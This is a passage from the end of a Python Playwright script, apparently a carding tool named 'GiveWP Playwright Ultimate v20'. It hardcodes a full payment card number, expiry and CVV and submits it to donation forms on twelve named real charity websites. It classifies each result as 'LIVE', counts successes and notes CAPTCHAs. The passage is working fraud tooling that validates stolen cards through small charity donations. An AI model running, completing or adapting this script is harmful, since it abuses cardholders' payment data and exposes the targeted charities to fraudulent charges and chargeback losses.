                continue
            status, code = ResultClassifier.classify(text)
            if status == 'LIVE':
                return {'status': 'LIVE', 'code': code, 'raw': text[:500]}

        # 3. alerts/errors
        try:
            alerts = await page.locator('[role="alert"], .give_error, .error, .alert').all()
            for alert in alerts:
                t = await alert.inner_text()
                if t:
                    status, code = ResultClassifier.classify(t)
                    return {'status': status, 'code': code, 'raw': t[:500]}
        except:
            pass

        # 4. unknown
        return {'status': 'UNKNOWN', 'code': 'NO_RESPONSE',
                'raw': (texts[0] if texts else '')[:500]}


# ═══════════════════════════════════════════════════════════════════
# RUNNER
# ═══════════════════════════════════════════════════════════════════
async def test_sites(card, sites):
    print('=' * 70)
    print('🔥 GiveWP Playwright Ultimate v20')
    print('=' * 70)
    print(f'💳 {card}')
    print(f'🌐 {len(sites)} sites')
    print('=' * 70)

    summary = []
    for name, url in sites:
        print(f'\n{"━" * 70}\n🌐 {name}\n{"━" * 70}')
        start = time.time()
        try:
            eng = GiveWPPlaywright(url, card, verbose=True, screenshots=False)
            result = await eng.run()
            elapsed = time.time() - start
            icon = '✅' if result['status'] == 'LIVE' else '❌'
            print(f'\n  {icon} {result["status"]} | {result["code"]} ({elapsed:.1f}s)')
            if result.get('raw'):
                print(f'     raw: {result["raw"][:250]}')
            print(f'     amount={result["debug"].get("amount_selected")} '
                  f'| paypal={result["debug"].get("paypal_frame")} '
                  f'| card={result["debug"].get("card_filled")} '
                  f'| captcha={result["debug"].get("captcha_detected")}')
            summary.append((name, result['status'], result['code'], elapsed,
                           result['debug'].get('captcha_detected')))
        except Exception as e:
            elapsed = time.time() - start
            print(f'  ❌ EXCEPTION: {str(e)[:200]}')
            summary.append((name, 'ERROR', str(e)[:60], elapsed, False))
        await asyncio.sleep(3)

    print(f'\n{"=" * 70}\n📊 SUMMARY\n{"=" * 70}')
    live = 0
    for n, s, c, t, cap in summary:
        icon = '✅' if s == 'LIVE' else '❌'
        if s == 'LIVE':
            live += 1
        print(f'{icon} {n:<22} | {s:<6} | {c:<25} | {t:.1f}s{" | CAPTCHA" if cap else ""}')
    print(f'\n💯 LIVE: {live}/{len(summary)}')


# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    CARD = '4217834081794714|11|26|614'

    SITES = [
        ('stychnohumanitarian', 'https://www.stychnohumanitarianfoundation.com/donations/donation-form/'),
        ('dandelions', 'https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1'),
        ('svdpvenicefl', 'https://svdpvenicefl.org/donations/donations/'),
        ('muhammadiyah', 'https://muhammadiyah.org.sg/donate/'),
        ('embracingpurpose', 'https://embracingpurpose.org/give-now/'),
        ('pieldemariposa', 'https://pieldemariposa.es/en/donate-now/'),
        ('superheroprojectinc', 'https://superheroprojectinc.org/donate/'),
        ('ymcadc', 'https://www.ymcadc.org/support-the-y/donate/'),
        ('newmorningyfs', 'https://www.newmorningyfs.org/give-help/donate/'),
        ('veritascc', 'https://www.veritascc.org/donate'),
        ('violin', 'https://violin.org/giving/'),
        ('abundantearth', 'https://abundantearthfoundation.org/donations/ancientcacao/'),
    ]

    try:
        asyncio.run(test_sites(CARD, SITES))
    except KeyboardInterrupt:
        print('\n⏹️ Interrupted')
    except Exception as e:
        print(f'\n❌ Fatal: {e}')
